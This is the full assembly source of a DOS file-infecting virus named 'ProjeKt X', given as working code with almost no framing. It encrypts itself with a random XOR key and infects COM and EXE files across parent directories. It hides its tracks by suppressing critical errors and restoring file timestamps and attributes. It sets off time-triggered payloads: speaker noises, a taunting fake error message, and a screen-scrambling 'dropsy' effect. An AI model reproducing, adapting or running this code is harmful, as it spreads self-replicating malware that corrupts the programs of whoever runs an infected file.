; PROJEKTX.ASM : ProjeKt X 

.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    100h                   ; COM file starting IP

id = 'AI'                               ; ID word for EXE infections
entry_point: db 0e9h,0,0                ; jmp decrypt

decrypt:                                ; handles encryption and decryption
          mov  bp,(offset heap - offset startencrypt)/2 ; iterations
patch_startencrypt:
          mov  bx,offset startencrypt   ; start of decryption
decrypt_loop:
          db   2eh,81h,37h            ; xor word ptr cs:[bx], xxxx
decrypt_value dw 0                      ; initialised at zero for null effect
          inc  bx                       ; calculate new decryption location
          inc  bx
          dec  bp                       ; If we are not done, then
          jnz  decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          cmp  sp,id                    ; COM or EXE?
          je   restoreEXE
restoreCOM:
          lea  si,[bp+save3]
          mov  di,100h
          push di                       ; For later return
          movsb
          jmp  short restoreEXIT
restoreEXE:
          push ds
          push es
          push cs                       ; DS = CS
          pop  ds
          push cs                       ; ES = CS
          pop  es
          lea  si,[bp+jmpsave2]
          lea  di,[bp+jmpsave]
          movsw
          movsw
          movsw
restoreEXIT:
          movsw

          mov  byte ptr [bp+numinfec],3 ; reset infection counter

          mov  ah,1Ah                   ; Set new DTA
          lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
          int  21h

          mov  ah,47h                   ; Get current directory
          mov  dl,0                     ; Current drive
          lea  si,[bp+origdir]          ; DS:SI->buffer
          int  21h
          mov  byte ptr [bp+backslash],'\' ; Prepare for later CHDIR

          mov  ax,3524h                 ; Get int 24 handler
          int  21h                      ; to ES:BX
          mov  word ptr [bp+oldint24],bx; Save it
          mov  word ptr [bp+oldint24+2],es
          mov  ah,25h                   ; Set new int 24 handler
          lea  dx,[bp+offset int24]     ; DS:DX->new handler
          int  21h
          push cs                       ; Restore ES
          pop  es                       ; 'cuz it was changed

dir_scan:                               ; "dot dot" traversal
          lea  dx,[bp+exe_mask]
          call infect_mask
          lea  dx,[bp+com_mask]
          call infect_mask
          mov  ah,3bh                   ; change directory
          lea  dx,[bp+dot_dot]          ; "cd .."
          int  21h
          jnc  dir_scan                 ; go back for mo!

done_infections:
                call    get_second
                cmp     ax,0032h                ; Did the function return 50?
                jl      skip00                  ; If less, skip effect
                jmp     short activate_one      ; Success -- skip jump

skip00:         
                call    get_hour
                cmp     ax,0017h                ; Did the function return 23?
                jne     skip01                  ; If not equal, skip effect
                call    get_weekday
                cmp     ax,0003h                ; Did the function return 3?
                jne     skip01                  ; If not equal, skip effect
                jmp     activate_two           ; Success -- skip jump

skip01:         jmp exit_virus

exit_virus:
          mov  ax,2524h                 ; Restore int 24 handler
          lds  dx,[bp+offset oldint24]  ; to original
          int  21h
          push cs
          pop  ds

          mov  ah,3bh                   ; change directory
          lea  dx,[bp+origdir-1]        ; original directory
          int  21h

          mov  ah,1ah                   ; restore DTA to default
          mov  dx,80h                   ; DTA in PSP
          cmp  sp,id-4                  ; EXE or COM?
          jz   returnEXE
returnCOM:
          int  21h
          retn                          ; 100h is on stack
returnEXE:
          pop  es
          pop  ds
          int  21h
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+jmpsave+2],ax
          add  ax,word ptr cs:[bp+stacksave+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+stacksave]
          mov  ss,ax
          sti
          db   0eah                     ; jmp ssss:oooo
jmpsave             dd ?                ; Original CS:IP
stacksave           dd ?                ; Original SS:SP
jmpsave2            db ?                ; Actually four bytes
save3               db 0cdh,20h,0       ; First 3 bytes of COM file
stacksave2          dd ?

activate_one:                               ; Conditions satisfied
                mov     cx,0003h                ; First argument is 3
new_shot:       push    cx                      ; Save the current count
                mov     dx,0140h                ; DX holds pitch
                mov     bx,0100h                ; BX holds shot duration
                in      al,061h                 ; Read the speaker port
                and     al,11111100b            ; Turn off the speaker bit
fire_shot:      xor     al,2                    ; Toggle the speaker bit
                out     061h,al                 ; Write AL to speaker port
                add     dx,09248h               ;
                mov     cl,3                    ;
                ror     dx,cl                   ; Figure out the delay time
                mov     cx,dx                   ;
                and     cx,01FFh                ;
                or      cx,10                   ;
shoot_pause:    loop    shoot_pause             ; Delay a bit
                dec     bx                      ; Are we done with the shot?
                jnz     fire_shot               ; If not, pulse the speaker
                and     al,11111100b            ; Turn off the speaker bit
                out     061h,al                 ; Write AL to speaker port
                mov     bx,0002h                ; BX holds delay time (ticks)
                xor     ah,ah                   ; Get time function
                int     1Ah                     ; BIOS timer interrupt
                add     bx,dx                   ; Add current time to delay
shoot_delay:    int     1Ah                     ; Get the time again
                cmp     dx,bx                   ; Are we done yet?
                jne     shoot_delay             ; If not, keep checking
                pop     cx                      ; Restore the count
                loop    new_shot                ; Do another shot
                jmp     go_now

go_now: 
          mov ax,0003h           ; stick 3 into ax.
          int 10h                ; Set up 80*25, text mode.  Clear the
                                 ; screen, too.
          mov ax,1112h           ; We are gunna use the 8*8 internal
                                 ; font, man.
          int 10h                ; Hey man, call the interrupt.
          mov     ah,09h                  ; Use DOS to print fake error
                                          ; message
          mov     dx,offset fake_msg
          int     21h
          mov ah,4ch            ; Lets ditch.
          int 21h               ; "Make it so."
          jmp  exit_virus

activate_two:                      ; First, get current video mode and page.
               mov  cx,0B800h      ;color display, color video mem for page 1
               mov  ah,15          ;Get current video mode
               int  10h
               cmp  al,2           ;Color?
               je   A2             ;Yes
               cmp  al,3           ;Color?
               je   A2             ;Yes
               cmp  al,7           ;Mono?
               je   A1             ;Yes
               int  20h            ;No,quit

                                   ;here if 80 col text mode; put video segment in ds.
A1:            mov  cx,0A300h      ;Set for mono; mono videomem for page 1
A2:            mov  bl,0           ;bx=page offset
               add  cx,bx          ;Video segment
               mov  ds,cx          ;in ds

                                   ;start dropsy effect
               xor  bx,bx          ;Start at top left corner
A3:            push bx             ;Save row start on stack
               mov  bp,80          ;Reset column counter
                                   ;Do next column in a row.
A4:            mov  si,bx          ;Set row top in si
               mov  ax,[si]        ;Get char & attr from screen
               cmp  al,20h         ;Is it a blank?
               je   A7             ;Yes, skip it
               mov  dx,ax          ;No, save it in dx
               mov  al,20h         ;Make it a space
               mov  [si],ax        ;and put on screen
               add  si,160         ;Set for next row
               mov  di,cs:Row      ;Get rows remaining
A5:            mov  ax,[si]        ;Get the char & attr from screen
               mov  [si],dx        ;Put top row char & attr there
A6:            call Vert           ;Wait for 2 vert retraces
               mov  [si],ax        ;Put original char & attr back
                                   ;Do next row, this column.
              add  si,160          ;Next row
              dec  di              ;Done all rows remaining?
              jne  A5              ;No, do next one
              mov  [si-160],dx     ;Put char & attr on line 25 as junk
                                   ;Do next column on this row.
A7:           add  bx,2            ;Next column, same row
              dec  bp              ;Dec column counter; done?
              jne  A4              ;No, do this column
;Do next row.
A8:           pop  bx              ;Get current row start
              add  bx,160          ;Next row
              dec  cs:Row          ;All rows done?
              jne  A3              ;No
A9:           mov  ax,4C00h  
              int  21h             ;Yes, quit to DOS with error code

                                   ;routine to deal with snow on CGA screen.
Vert:         push ax
              push dx
              push cx              ;Save all registers used
              mov  cl,2            ;Wait for 2 vert retraces
              mov  dx,3DAh         ;CRT status port
F1:           in   al,dx           ;Read status
              test al,8            ;Vert retrace went hi?
              je   F1              ;No, wait for it
              dec  cl              ;2nd one?
              je   F3              ;Yes, write during blanking time
F2:           in   al,dx           ;No, get status
              test al,8            ;Vert retrace went low?
              jne  F2              ;No, wait for it
              jmp  F1              ;Yes, wait for next hi
F3:           pop  cx
              pop  dx
              pop  ax              ;Restore registers
              ret
              jmp exit_virus

get_weekday     proc    near
                mov     ah,02Ah                 ; DOS get date function
                int     021h
                cbw                             ; Sign-extend AL into AX
                ret                             ; Return to caller
get_weekday     endp

get_day         proc    near
                mov     ah,02Ah                 ; DOS get date function
                int     021h
                mov     al,dl                   ; Copy day into AL
                cbw                             ; Sign-extend AL into AX
                ret                             ; Return to caller
get_day         endp

get_hour        proc    near
                mov     ah,02Ch                 ; DOS get time function
                int     021h
                mov     al,ch                   ; Copy hour into AL
                cbw                             ; Sign-extend AL into AX
                ret                             ; Return to caller
get_hour        endp

get_minute      proc    near
                mov     ah,02Ch                 ; DOS get time function
                int     021h
                mov     al,cl                   ; Copy minute into AL
                cbw                             ; Sign-extend AL into AX
                ret                             ; Return to caller
get_minute      endp

get_second      proc    near
                mov     ah,02Ch                 ; DOS get time function
                int     021h
                mov     al,dh                   ; Copy second into AL
                cbw                             ; Sign-extend AL into AX
                ret                             ; Return to caller
get_second      endp

note            db '[ProjeKt X]',0    

infect_mask:
          mov  ah,4eh                   ; find first file
          mov  cx,7                     ; any attribute
findfirstnext:
          int  21h                      ; DS:DX points to mask
          jc   exit_infect_mask         ; No mo files found

          mov  al,0h                    ; Open read only
          call open

          mov  ah,3fh                   ; Read file to buffer
          lea  dx,[bp+buffer]           ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          cmp  word ptr [bp+buffer],'ZM'; EXE?
          jz   checkEXE                 ; Why yes, yes it is!
checkCOM:
          mov  ax,word ptr [bp+newDTA+1Ah] ; Filesize in DTA
          cmp  ax,3230                  ; Is it too small?
          jb   find_next

          cmp  ax,65535-(endheap-decrypt) ; Is it too large?
          ja   find_next

          mov  bx,word ptr [bp+buffer+1]; get jmp location
          add  bx,heap-decrypt+3        ; Adjust for virus size
          cmp  ax,bx
          je   find_next                ; already infected
          jmp  infect_com
checkEXE: cmp  word ptr [bp+buffer+10h],id ; is it already infected?
          jnz  infect_exe
find_next:
          mov  ah,4fh                   ; find next file
          jmp  short findfirstnext
exit_infect_mask: ret

infect_exe:
          les  ax, dword ptr [bp+buffer+14h] ; Save old entry point
          mov  word ptr [bp+jmpsave2], ax
          mov  word ptr [bp+jmpsave2+2], es

          les  ax, dword ptr [bp+buffer+0Eh] ; Save old stack
          mov  word ptr [bp+stacksave2], es
          mov  word ptr [bp+stacksave2+2], ax

          mov  ax, word ptr [bp+buffer + 8] ; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax, [bp+offset newDTA+26]; Get file size
          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr [bp+buffer+14h], dx ; New entry point
          mov  word ptr [bp+buffer+16h], ax

          mov  word ptr [bp+buffer+0Eh], ax ; and stack
          mov  word ptr [bp+buffer+10h], id

          pop  dx                       ; get file length
          pop  ax

          add  ax, heap-decrypt         ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr [bp+buffer+4], dx ; new file size
          mov  word ptr [bp+buffer+2], ax

          push cs                       ; restore ES
          pop  es

          push word ptr [bp+buffer+14h] ; needed later
          mov  cx, 1ah
          jmp  short finishinfection
infect_com:                             ; ax = filesize
          mov  cx,3
          sub  ax,cx
          lea  si,[bp+offset buffer]
          lea  di,[bp+offset save3]
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
          push ax                       ; needed later
finishinfection:
          push cx                       ; Save # bytes to write
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  al,2
          call open

          mov  ah,40h                   ; Write to file
          lea  dx,[bp+buffer]           ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          mov  ax,4202h                 ; Move file pointer
          xor  cx,cx                    ; to end of file
          cwd                           ; xor dx,dx
          int  21h

get_encrypt_value:
          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          or  dx,dx                     ; Check if encryption value = 0
          jz  get_encrypt_value         ; Get another if it is
          mov  [bp+decrypt_value],dx    ; Set new encryption value
          lea  di,[bp+code_store]
          mov  ax,5355h                 ; push bp,push bx
          stosw
          lea  si,[bp+decrypt]          ; Copy encryption function
          mov  cx,startencrypt-decrypt  ; Bytes to move
          push si                       ; Save for later use
          push cx
          rep  movsb

          lea    si,[bp+write]          ; Copy writing function
          mov    cx,endwrite-write      ; Bytes to move
          rep    movsb
          pop    cx
          pop    si
          pop    dx                     ; Entry point of virus
          push   di
          push   si
          push   cx
          rep    movsb                  ; Copy decryption function
          mov    ax,5b5dh               ; pop bx,pop bp
          stosw
          mov    al,0c3h                ; retn
          stosb

          add    dx,offset startencrypt - offset decrypt ; Calculate new
          mov    word ptr [bp+patch_startencrypt+1],dx ; starting offset of
          call   code_store             ; decryption
          pop    cx
          pop    di
          pop    si
          rep    movsb                  ; Restore decryption function

          mov  ax,5701h                 ; Restore creation date/time
          mov  cx,word ptr [bp+newDTA+16h] ; time
          mov  dx,word ptr [bp+newDTA+18h] ; date
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          mov ch,0
          mov cl,byte ptr [bp+newDTA+15h] ; Restore original
          call attributes               ; attributes

          dec  byte ptr [bp+numinfec]   ; One mo infection
          jnz  mo_infections            ; Not enough
          pop  ax                       ; remove call from stack
          jmp  done_infections
mo_infections: jmp find_next

open:
          mov  ah,3dh
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          xchg ax,bx
          ret

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          ret

write:
          pop  bx                       ; Restore file handle
          pop  bp                       ; Restore relativeness
          mov  ah,40h                   ; Write to file
          lea  dx,[bp+decrypt]          ; Concatenate virus
          mov  cx,heap-decrypt          ; # bytes to write
          int  21h
          push bx
          push bp
endwrite:

int24:                                  ; New int 24h (error) handler
          mov  al,3                     ; Fail call
          iret                          ; Return control

exe_mask            db '*.exe',0
com_mask            db '*.com',0
dot_dot             db '..',0
heap:                                   ; Variables not in code
; The following code is the buffer for the write function
code_store:         db (startencrypt-decrypt)*2+(endwrite-write)+1 dup (?)
oldint24            dd ?                ; Storage for old int 24h handler      
backslash           db ?
fake_msg            db "If YOU can be a half-wit, so can I!!$"
Row                 dw 24
origdir             db 64 dup (?)       ; Current directory buffer             
newDTA              db 43 dup (?)       ; Temporary DTA                        
numinfec            db ?                ; Infections this run                  
buffer              db 1ah dup (?)      ; read buffer                          
endheap:                                ; End of virus
end       entry_point
